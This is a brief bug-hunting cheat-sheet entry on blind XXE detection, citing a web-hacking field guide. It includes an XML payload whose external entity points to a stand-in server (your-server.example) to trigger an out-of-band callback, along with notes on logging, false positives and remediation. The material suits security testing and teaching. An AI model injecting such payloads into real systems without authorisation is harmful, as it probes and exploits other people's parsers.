# Blind XXE External Callback

- What it is: An XML parser resolves an external entity but does not return parsed content to the requester.
- Point an entity to an HTTP endpoint you control.
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "https://your-server.example/xxe">
]>
<foo>&xxe;</foo>
```
- A server-side callback proves external entity resolution even if no XML output is visible.
- Log timestamp, source IP, and requested path.
- False positive: a human or security scanner could visit the URL independently; correlate with unique tokens.
- Edge case: outbound HTTP may be blocked while DNS remains allowed.
- Remediation: disable external entity resolution and outbound network access from XML parsers.
## Source: Real-World Bug Hunting — A Field Guide to Web Hacking, Ch. 11
